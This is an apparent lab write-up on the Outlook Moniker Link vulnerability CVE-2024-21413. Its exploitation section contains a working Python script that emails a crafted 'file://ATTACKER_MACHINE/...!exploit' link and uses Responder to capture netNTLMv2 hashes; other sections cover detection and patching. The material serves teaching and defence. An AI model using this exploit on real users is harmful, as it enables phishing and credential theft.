## Moniker Link (CVE-2024-21413)

On February 13th, 2024, Microsoft announced a Microsoft Outlook RCE & credential leak vulnerability with the assigned CVE of **CVE-2024-21413 (Moniker Link)**.  
Haifei Li of Check Point Research is credited with discovering the vulnerability.

This vulnerability bypasses Outlook's security mechanisms when handling a specific type of hyperlink known as a **Moniker Link**.  
An attacker can abuse this by sending an email containing a malicious Moniker Link to a victim, resulting in Outlook sending the user's **NTLM credentials** to the attacker once the hyperlink is clicked.

**Vulnerability Scoring**

| CVSS | Description |
|------|-------------|
| Publish date | February 13th, 2024 |
| MS article | [CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413) |
| Impact | Remote Code Execution & Credential Leak |
| Severity | Critical |
| Attack Complexity | Low |
| Scoring | 9.8 |

**Affected Office Releases**

| Release | Version |
|---------|----------|
| Microsoft Office LTSC 2021 | affected from 19.0.0 |
| Microsoft 365 Apps for Enterprise | affected from 16.0.1 |
| Microsoft Office 2019 | affected from 16.0.1 |
| Microsoft Office 2016 | affected from 16.0.0 before 16.0.5435.1001 |

---

### 🔹 Moniker Link

- Outlook can render emails as HTML.  
- It can parse hyperlinks like HTTP/HTTPS, but also **Moniker Links**.  
- Normally, Outlook prompts a **Protected View warning** when external applications are triggered.  

Protected View: opens emails in **read-only mode** to block risky elements like macros.  

Example of Moniker Link:

```html
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
````

Bypassing Protected View using `!`:

```html
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

✅ Even if the share does not exist, an **authentication attempt** is still triggered, leaking the victim's **Windows netNTLMv2 hash**.

**Q\&A**

* **What Moniker Link type do we use in the hyperlink?**
  `file://`

* **What is the special character used to bypass Outlook's "Protected View"?**
  `!`

---

### 🔹 Exploitation

The attack involves sending a crafted email with a Moniker Link that bypasses Outlook's Protected View.

#### PoC Code (exploit.py)

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")

html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

msgHtml = MIMEText(html_content, 'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

---

#### PoC Summary

* Uses attacker & victim email.
* Requires password (for lab: `attacker`).
* Contains malicious Moniker Link.
* Sends via SMTP server.


#### Starting Responder

```bash
root@attackbox:# responder -I ens5
```

*Output snippet:*

```
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  [+] Listening for events...
```


#### Running the Exploit

```bash
root@attackbox:# python3 exploit.py
Enter your attacker email password: attacker
Email delivered
```

✅ After clicking the email link, **Responder captures the netNTLMv2 hash**.


**Q\&A**

* **What is the name of the application that we use on the AttackBox to capture the user's hash?**
  `responder`

* **What type of hash is captured once the hyperlink in the email has been clicked?**
  `netNTLMv2`

---

### 🔹 Detection

#### YARA Rule

```yara
rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
   meta:
      description = "Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook"
      author = "X__Junior, Florian Roth"
      reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"
      date = "2024-02-17"
      modified = "2024-02-19"
      score = 75

   strings:
      $a1 = "Subject: "
      $a2 = "Received: "
      $xr1 = /file:\/\/\/\\\\[^"']{6,600}\.(docx|txt|pdf|xlsx|pptx|odt|etc|jpg|png|gif|bmp|tiff|svg|mp4|avi|mov|wmv|flv|mkv|mp3|wav|aac|flac|ogg|wma|exe|msi|bat|cmd|ps1|zip|rar|7z|targz|iso|dll|sys|ini|cfg|reg|html|css|java|py|c|cpp|db|sql|mdb|accdb|sqlite|eml|pst|ost|mbox|htm|php|asp|jsp|xml|ttf|otf|woff|woff2|rtf|chm|hta|js|lnk|vbe|vbs|wsf|xls|xlsm|xltm|xlt|doc|docm|dot|dotm)!/

   condition:
      filesize < 1000KB
      and all of ($a*)
      and 1 of ($xr*)
}
```

#### Wireshark

* SMB request from victim → attacker.
* Shows truncated **netNTLMv2 hash**.

---

### 🔹 Remediation

* Microsoft patched this in **February 2024 Patch Tuesday**.
* Update Office via Windows Update or Microsoft Update Catalog.

**Best Practices:**

* Do not click random/unsolicited links.
* Always preview links before clicking.
* Report suspicious emails.

⚠️ Since the vulnerability bypasses Protected View, **there is no Outlook config fix**. Blocking SMB may cause operational issues, but blocking at **firewall level** could be an option.

---

### 🔹 Q&A Summary on Moniker Link Exploit

**Q1. Why is it called a Moniker Link? How is it different from other phishing links?**  
A *Moniker* in Windows is a COM (Component Object Model) object that acts as a reference to something (like a file, app, or resource).  
Outlook can handle `file://` moniker links in addition to normal HTTP/HTTPS links.  
Attackers abused this to trick Outlook into opening UNC paths (network shares), which triggers NTLM authentication.  
Unlike normal phishing links (HTTP/HTTPS), Moniker Links exploit **Windows authentication mechanisms** instead of just redirecting users to fake sites.  

**Q2. Why does Windows send a hash just by clicking the Moniker Link?**  
When Outlook tries to fetch `file://attacker_ip/share`, it uses **SMB protocol**.  
SMB asks: *“Who are you? Prove it.”*  
Windows automatically replies with the user’s **NetNTLMv2 hash** (challenge-response authentication).  
This happens silently, no user prompt.  

**Q3. Why is the NetNTLMv2 hash sensitive if it’s “just a hash”?**  
It’s not a password, but it’s **crackable** with tools like `hashcat` or can be **relayed** to authenticate elsewhere.  
If cracked, the attacker gets the real user password.  
Even if not cracked, NTLM hashes can be used in **relay attacks** to impersonate the victim.  
It can belong to *any* logged-in Windows user (regular or admin). If it’s an admin, the impact is catastrophic.  

**Q4. What does the `!` in the link do?**  
Normally, Outlook’s **Protected View** blocks external application/file launches.  
Adding `!exploit` to the `file://` path confused Outlook’s parser, bypassing the prompt/block.  
That’s the heart of CVE-2024-21413.  

**Q5. So what’s really happening when the victim clicks the link?**  
1. Victim clicks `file://attacker_ip/test!exploit`.  
2. Outlook/Windows tries to fetch the file over SMB.  
3. Attacker’s Responder tool poses as an SMB server: *“Who are you?”*  
4. Victim’s Windows machine automatically sends its NetNTLMv2 hash.  
5. Attacker now has the victim’s credentials in hash form.  

**Q6. SMB vs FTP - is SMB like FTP? Does it use FTP under the hood?**  
No. SMB ≠ FTP.  
FTP is a standalone file transfer protocol.  
SMB is Windows’ protocol for **file/printer/resource sharing**.  
SMB runs over TCP (port 445), not over FTP.  

**Q7. Why doesn’t Windows just send a username instead of a sensitive hash?**  
Because SMB authentication requires proving identity, not just declaring it.  
Windows’ legacy design: “security through automatic authentication” (to make file sharing easy).  
Unfortunately, this convenience = automatic hash leakage when misused.  

**Q8. What did Microsoft do to patch it?**  
- **Patched the `!` bypass** → Outlook no longer lets `file://...!exploit` sneak past Protected View.  
- **Blocked/disabled `file://` links** inside Outlook emails (now they either don’t work or warn).  
- **Hardened NTLM authentication** in Windows:  
  - Outlook won’t auto-send NTLM hashes to untrusted remote servers anymore.  
  - Admins can enforce Group Policy to restrict or disable NTLM outside the domain.  
- They didn’t add a “big scary popup,” they just blocked the behavior silently.  

